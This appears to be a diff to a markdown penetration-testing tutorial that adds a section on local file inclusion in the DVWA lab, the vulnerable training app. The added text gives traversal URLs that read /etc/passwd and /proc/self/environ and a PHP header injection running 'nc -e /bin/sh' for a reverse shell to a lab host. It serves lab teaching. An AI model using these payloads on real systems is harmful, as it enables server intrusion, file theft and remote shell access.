@@ -63,7 +63,7 @@ This will scan example.com for a large number of potentially accessible files. T
 
 * [Maltego](https://en.wikipedia.org/wiki/Maltego) - Maltego is software used for gathering and managing open-source intelligence and forensics.
 
-## Explotations
+## Exploitations
 
 This section is about discovering and using exploits.
 
@@ -98,3 +98,10 @@ In the DVWA website, go to the Command Execution example and enter the following
 
 Just with that, the attacker now essentially has a netcat terminal session with the target machine.
 
+## Local file exploits
+
+Since the fi example in DVWA exploits the file inclusion we can easily read the contents of any file on the server. For example to read the file `/etc/passwd` we just put the following in the address bar of the browser and the contents of the /etc/passwd file are sent back to us `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd`.
+
+So there is a file in linux / unix systems that can be used to read all enviornment variables. The file is `/proc/self/environ`. We can pass that to the server and read the contents like so: `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ`
+
+So with this we can intercept the request (using Burp) and change the 'User-Agent' header value to some php script that we want to execute. Basically we can set up a reverse connection (similar to the code execution example above) again using the following injected code into the header: `<? passthru('nc -e /bin/sh 10.0.2.15 8081');?>`
